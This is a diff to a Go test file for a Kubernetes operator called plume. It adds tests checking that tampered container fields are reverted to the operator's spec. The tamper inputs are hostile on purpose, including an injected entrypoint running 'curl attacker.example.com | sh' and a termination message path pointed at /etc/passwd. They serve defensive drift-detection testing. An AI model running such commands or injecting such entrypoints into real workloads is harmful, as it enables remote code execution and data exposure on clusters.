@@ -722,19 +722,6 @@ func TestEachContainerFieldIsIndividuallyReconciled(t *testing.T) {
 			},
 		},
 		{
-			field: "hostPort",
-			tamper: func(c *corev1.Container) {
-				c.Ports[0].HostPort = 31337
-			},
-			check: func(t *testing.T, c corev1.Container) {
-				if len(c.Ports) > 0 && c.Ports[0].HostPort != 0 {
-					t.Errorf("hostPort %d survived: plume never sets it, so binding a node "+
-						"port out-of-band would be invisible to a derivative comparison",
-						c.Ports[0].HostPort)
-				}
-			},
-		},
-		{
 			field:  "roRootfs",
 			tamper: func(c *corev1.Container) { c.SecurityContext.ReadOnlyRootFilesystem = boolPtr(false) },
 			check: func(t *testing.T, c corev1.Container) {
@@ -851,5 +838,108 @@ func TestPortEditReachesTheWorkloadWithoutANewRevision(t *testing.T) {
 	}
 	if p := d.Spec.Template.Spec.Containers[0].Ports; len(p) != 1 || p[0].ContainerPort != 9090 {
 		t.Errorf("container port is %v after an in-place edit to 9090", p)
+	}
+}
+
+// Y1 — the four fields plume left unset were unreverted drift, and one was an
+// escalation path. An operator that reverts the image tag but tolerates
+// imagePullPolicy: Never has corrected nothing: Never tells the kubelet to use
+// whatever local image already carries that tag, so an attacker who can also
+// place an image on a node keeps a poisoned workload while plume reports Ready.
+// It also sidesteps ADR-0019's cosign posture — nothing pulls, so nothing is
+// verified at pull time.
+func TestPreviouslyExemptedFieldsAreReverted(t *testing.T) {
+	for _, tc := range []struct {
+		field  string
+		tamper func(*corev1.Container)
+		check  func(*testing.T, corev1.Container)
+	}{
+		{
+			field:  "imagepullpolicy",
+			tamper: func(c *corev1.Container) { c.ImagePullPolicy = corev1.PullNever },
+			check: func(t *testing.T, c corev1.Container) {
+				if c.ImagePullPolicy != corev1.PullAlways {
+					t.Errorf("imagePullPolicy is %q, want Always. Never pins whatever local "+
+						"image carries this tag, so reverting the tag corrects nothing and "+
+						"no pull means no signature check", c.ImagePullPolicy)
+				}
+			},
+		},
+		{
+			field:  "terminationmessagepath",
+			tamper: func(c *corev1.Container) { c.TerminationMessagePath = "/etc/passwd" },
+			check: func(t *testing.T, c corev1.Container) {
+				if c.TerminationMessagePath != corev1.TerminationMessagePathDefault {
+					t.Errorf("terminationMessagePath is %q: the kubelet reads up to 4KB from "+
+						"it into pod status, readable by anyone with pod-get",
+						c.TerminationMessagePath)
+				}
+			},
+		},
+		{
+			field:  "protocol",
+			tamper: func(c *corev1.Container) { c.Ports[0].Protocol = corev1.ProtocolUDP },
+			check: func(t *testing.T, c corev1.Container) {
+				if len(c.Ports) != 1 || c.Ports[0].Protocol != corev1.ProtocolTCP {
+					t.Errorf("port protocol is %v, want TCP", c.Ports)
+				}
+			},
+		},
+		// Y2 — replaces the hostPort probe, which could not fail. apimachinery's
+		// deepValueDerive skips zero values only for Slice, String, Map and Ptr
+		// kinds; numeric and boolean fields fall through to full DeepEqual, so an
+		// int32 hostPort was already caught derivatively. The gap is UNSET fields
+		// of those four kinds — and overriding the entrypoint is the sharpest
+		// instance, since plume leaves Command and Args unset entirely.
+		{
+			field: "command",
+			tamper: func(c *corev1.Container) {
+				c.Command = []string{"/bin/sh", "-c", "curl attacker.example.com | sh"}
+			},
+			check: func(t *testing.T, c corev1.Container) {
+				if len(c.Command) != 0 {
+					t.Errorf("an injected entrypoint survived: %v. Command is a slice and "+
+						"plume leaves it unset, so a derivative comparison skips it — anyone "+
+						"with deployments/update could replace what the container runs while "+
+						"the image tag, and therefore the revision, looks untouched", c.Command)
+				}
+			},
+		},
+		{
+			field:  "workingdir",
+			tamper: func(c *corev1.Container) { c.WorkingDir = "/tmp/attacker" },
+			check: func(t *testing.T, c corev1.Container) {
+				if c.WorkingDir != "" {
+					t.Errorf("workingDir %q survived: an unset string is skipped derivatively", c.WorkingDir)
+				}
+			},
+		},
+	} {
+		t.Run(tc.field, func(t *testing.T) {
+			ns := newNamespace(t)
+			name := "exempt-" + tc.field
+			a := mustCreateAgent(t, ns, name, nil)
+			r := newReconciler(false)
+			rev := revision.Hash(a.Spec)
+			settle(t, r, a)
+			key := types.NamespacedName{Namespace: ns, Name: controller.WorkloadName(name, rev)}
+			markAvailable(t, ns, key.Name, 1)
+			settle(t, r, a)
+
+			var d appsv1.Deployment
+			if err := k8s.Get(context.Background(), key, &d); err != nil {
+				t.Fatalf("get: %v", err)
+			}
+			tc.tamper(&d.Spec.Template.Spec.Containers[0])
+			if err := k8s.Update(context.Background(), &d); err != nil {
+				t.Fatalf("tamper: %v", err)
+			}
+			settle(t, r, a)
+
+			if err := k8s.Get(context.Background(), key, &d); err != nil {
+				t.Fatalf("get: %v", err)
+			}
+			tc.check(t, d.Spec.Template.Spec.Containers[0])
+		})
 	}
 }
